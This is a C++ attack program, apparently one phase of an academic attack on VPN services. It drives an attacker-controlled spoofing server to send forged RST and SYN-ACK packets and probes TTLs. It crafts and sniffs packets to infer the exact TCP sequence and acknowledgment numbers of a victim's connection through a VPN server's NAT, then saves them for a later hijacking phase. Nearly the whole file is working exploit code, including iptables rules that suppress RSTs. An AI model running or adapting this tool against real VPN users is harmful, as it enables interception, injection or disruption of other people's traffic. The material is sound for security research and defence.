#include <iostream>
#include <string>
#include <cstdio>
#include <cstdlib>
#include <unistd.h>
#include <time.h>
#include <set>
#include <map>
#include <thread>
#include <tins/tins.h>
#include "httplib.h"
using namespace std;
using namespace Tins;

IPv4Address remote_server_ip, attacker_private_ip;
uint16_t remote_server_port;
uint16_t guessed_client_port;
uint32_t exact_seq, exact_ack;
bool seq_got = false;
string packet_iface;
string sniff_filter;

IPv4Address spoof_server_ip;
uint16_t spoof_server_port;

int ttl_for_rst_probed;
bool ttl_got = false;

bool debug = true;

double __get_us(struct timeval t) {
	return (t.tv_sec * 1000000 + t.tv_usec);
}
// Ask the spoofable server to send RST packets to clean the NAT mapping of client_port at the VPN server
void trigger_spoof_server_send_rst(httplib::Client& cli, int ttl_for_rst) {
    if(debug) 
        cout << "trigger_spoof_server_send_rst: client_port: " << guessed_client_port << " ttl: " << ttl_for_rst << endl;
    httplib::Params params;
    params.emplace("guessed_client_port", to_string(guessed_client_port));
    params.emplace("ttl_for_rst", to_string(ttl_for_rst));
    auto res = cli.Post("/send_rst", params);
    if(debug) 
        cout << res->status << ", " << res->body << endl;
}

// Ask the spoofable server to send RST packets to clean the NAT mapping of client_port at the VPN server
void trigger_spoof_server_send_sa(httplib::Client& cli) {
    if(debug) 
        cout << "trigger_spoof_server_send_sa: client_port: " << guessed_client_port << " exact_seq: " << exact_seq << ", exact_ack: " << exact_ack << endl;
    httplib::Params params;
    params.emplace("guessed_client_port", to_string(guessed_client_port));
    params.emplace("exact_seq", to_string(exact_seq));
    params.emplace("exact_ack", to_string(exact_ack));
    auto res = cli.Post("/send_sa", params);
    if(debug) 
        cout << res->status << ", " << res->body << endl;
}

// Ask the spoofable server to send RST packets to clean the NAT mapping of client_port at the VPN server
void trigger_spoof_server_send_sa_to_get_ttl(httplib::Client& cli) {
    if(debug) 
        cout << "trigger_spoof_server_send_sa_to_get_ttl: " << endl;
    PacketSender sender;
	NetworkInterface iface(packet_iface); 
    uint16_t attacker_port = guessed_client_port - 1;
    // just create a mapping at the VPN server, to let the spoofed ACK from the spoof server in, Then get the TTL, so the port is not that important
    IP syn_pkt = IP(remote_server_ip, attacker_private_ip) / TCP(spoof_server_port, attacker_port);
    syn_pkt.rfind_pdu<IP>().ttl(5);
    syn_pkt.rfind_pdu<TCP>().set_flag(TCP::SYN, 1);
    syn_pkt.rfind_pdu<TCP>().seq(1);
    sender.send(syn_pkt, iface);
    httplib::Params params;
    params.emplace("attacker_port", to_string(attacker_port));
    auto res = cli.Post("/send_sa_for_ttl", params);
    if(debug) 
        cout << res->status << ", " << res->body << endl;
}

// Save the seq and ack to file for the third phase to use.
void save_seq_ack_to_file() {
    ofstream fout; 
	fout.open("../complete_attack/SEQ_ACK_RESULT"); 
	fout << "seq: " << exact_seq << endl;
	fout << "ack: " << exact_ack << endl;
	fout.close();
    return;
}
//for nordvpn
void resynchronize(httplib::Client& cli) {
    PacketSender sender;
    NetworkInterface iface(packet_iface); 
    IP syn_pkt = IP(remote_server_ip, attacker_private_ip) / TCP(remote_server_port, guessed_client_port);
    syn_pkt.rfind_pdu<IP>().ttl(10);
    syn_pkt.rfind_pdu<TCP>().set_flag(TCP::SYN, 1);
    syn_pkt.rfind_pdu<TCP>().seq(exact_ack - 1);
    sender.send(syn_pkt, iface);
    trigger_spoof_server_send_sa(cli);
    sleep(5);
    IP ack_pkt = IP(remote_server_ip, attacker_private_ip) / TCP(remote_server_port, guessed_client_port);
    ack_pkt.rfind_pdu<TCP>().set_flag(TCP::ACK, 1);
    ack_pkt.rfind_pdu<TCP>().seq(exact_ack);
    ack_pkt.rfind_pdu<TCP>().ack_seq(exact_seq);
    sender.send(ack_pkt, iface);
}

// In this thread, we will get the sequence and acknowledgment numbers of the victim connection.
void get_seq_ack(httplib::Client& cli) {
    PacketSender sender;
    NetworkInterface iface(packet_iface); 
	struct timeval start_time, stop_time;
	gettimeofday(&start_time, NULL);

    // first, ask the spoofable server to send RSTs to the VPN server.
    while(!ttl_got) {
        cout << "You should first get the TTL value for TCP RSTs" << endl;
        trigger_spoof_server_send_sa_to_get_ttl(cli);
        sleep(5);
    };

    int ttl_dir[11] = {0, 1, -1, 2, -2, 3, -3, 4, -4, 5, -5};
    // for (int ttl_for_rst = ttl_for_rst_probed; ttl_for_rst <= ttl_for_rst_probed + 1; ttl_for_rst++) {
    for (int i = 0; i < 10; i++) {
        int ttl_for_rst = ttl_for_rst_probed + ttl_dir[i];
        trigger_spoof_server_send_rst(cli, ttl_for_rst);
        gettimeofday(&stop_time, NULL);
        if(debug) 
            cout << "send rsts time: " << (__get_us(stop_time) - __get_us(start_time)) / 1000 << " ms, will sleep for 15 seconds until the NAT mapping expires." << endl;
        sleep(15);

        system("iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP");
        // second, send a data packet to the outside server with my own IP address.
        IP pa_pkt = IP(remote_server_ip, attacker_private_ip) / TCP(remote_server_port, guessed_client_port);
        pa_pkt.rfind_pdu<TCP>().set_flag(TCP::PSH, 1);
        // pa_pkt.rfind_pdu<TCP>().set_flag(TCP::SYN, 1);
        pa_pkt.rfind_pdu<TCP>().set_flag(TCP::ACK, 1);
        pa_pkt.rfind_pdu<TCP>().seq(1);
        sender.send(pa_pkt, iface);
        
        if(debug) 
            cout << "PA packet sent, wait for the ACK back" << endl;
        // third, wait for the outside server to send the ACK packet with the exact SEQ and ACK back.
        // if you do not receive the ACK packet (sad), you need to debug to find what happened.
        // maybe should check the RST TTL, or its sequence number.
        sleep(3);
        if (!seq_got) {
            cout << "TTL wrong, will try another TTL value" << endl;
            system("iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP");
            IP rst_pkt = IP(remote_server_ip, attacker_private_ip) / TCP(remote_server_port, guessed_client_port);
            rst_pkt.rfind_pdu<TCP>().set_flag(TCP::RST, 1);
            rst_pkt.rfind_pdu<TCP>().seq(2);
            sender.send(rst_pkt, iface);
            continue;
        } else {
            if(debug) 
                cout << "Received exact SEQ: " << exact_seq << ", Received exact ACK: " << exact_ack << endl;
            save_seq_ack_to_file();
            gettimeofday(&stop_time, NULL);
            if(debug) 
                cout << "Get seq and ack time: " << (__get_us(stop_time) - __get_us(start_time)) / 1000 << " ms" << endl;   
            // resynchronize(cli);
            system("iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP");
            break;
        }
    }
    if(!seq_got) 
        cout << "Something wrong! You need to debug the code" << endl;
}


// sniff to receive the ACK packet and extract the seq and ack of the ACK.
bool callback(const PDU &pdu) {
    const IP &ip = pdu.rfind_pdu<IP>(); 
    const TCP &tcp = pdu.rfind_pdu<TCP>(); 
	if (ip.protocol() == 6 && ip.src_addr() == remote_server_ip) {
        if (tcp.sport() == remote_server_port && tcp.dport() == guessed_client_port && (tcp.flags() == TCP::ACK)) {
            exact_seq = tcp.seq();
            exact_ack = tcp.ack_seq();
            seq_got = true;
        }
        else if (!ttl_got && tcp.sport() == spoof_server_port && tcp.dport() == guessed_client_port - 1) {
            ttl_for_rst_probed = 64 - ip.ttl();
            ttl_got = true;
            // PacketSender sender;
            // NetworkInterface iface(packet_iface); 
            // IP rst_pkt = IP(remote_server_ip, attacker_private_ip) / TCP(remote_server_port, 30000);
            // rst_pkt.rfind_pdu<TCP>().set_flag(TCP::RST, 1);
            // rst_pkt.rfind_pdu<TCP>().seq(2);
            // sender.send(rst_pkt, iface);
            if(debug) 
                cout << "Got the TTL value for RSTs: " << ttl_for_rst_probed << endl;
        }
    }

    return true;
}

void sniff_packets() {
    // Construct the sniffer configuration object
    SnifferConfiguration config;
    config.set_filter(sniff_filter);
	config.set_immediate_mode(true);
    Sniffer(packet_iface, config).sniff_loop(callback);
}

int main(int argc, char** argv)
{
    if (argc != 8) {
        cout << "wrong number of args ---> (attacker_private_ip, guessed_client_port, remote_server_ip, remote_server_port, spoof_server_ip, spoof_server_port, packet_iface)" << endl;
        return 0;
        //e.g., sudo ./seq_infer 10.20.189.17 40592 43.159.39.110 5904 http://43.159.39.110:5902 tun0
    }
    attacker_private_ip = IPv4Address(argv[1]);
    guessed_client_port = atoi(argv[2]);
    remote_server_ip = IPv4Address(argv[3]);
    remote_server_port = atoi(argv[4]);
    spoof_server_ip = IPv4Address(argv[5]);
    spoof_server_port = atoi(argv[6]);
    packet_iface = argv[7];
    
    string spoof_server_config = "http://" + string(argv[5]) + ":" + string(argv[6]);
    // sniff_filter = "tcp port " + string(argv[4]) + " or tcp port " + string(argv[6]) + " and ip src " + argv[3];
    sniff_filter =  "(ip src " + string(argv[3]) + " and tcp port " + string(argv[4]) + ") or (ip src " + argv[3] + " and tcp port " + string(argv[6]) + ")";

    cout << sniff_filter << endl;
    // start the sniff thread
    thread sniff_thread(sniff_packets);
    
    // connect to the spoofable server and control it to send RST packets.
    httplib::Client cli(spoof_server_config);
    cli.set_keep_alive(true);
    cli.set_connection_timeout(0, 2000000); // 300 milliseconds
    cli.set_read_timeout(20, 0); // 10 seconds
    cli.set_write_timeout(20, 0); // 10 seconds
    
    // second, send a data packet to the outside server with my own IP address.
    PacketSender sender;
	NetworkInterface iface(packet_iface); 
    
    // IP syn_pkt = IP(spoof_server_ip, attacker_private_ip) / TCP(spoof_server_port, guessed_client_port - 1);
    // syn_pkt.rfind_pdu<IP>().ttl(64);
    // syn_pkt.rfind_pdu<TCP>().set_flag(TCP::SYN, 1);
    // syn_pkt.rfind_pdu<TCP>().seq(1);
    // sender.send(syn_pkt, iface);

    trigger_spoof_server_send_sa_to_get_ttl(cli);
    // start the main thread to get the SEQ and ACK numbers.
    get_seq_ack(cli);
    sniff_thread.detach();

	return 0;
}
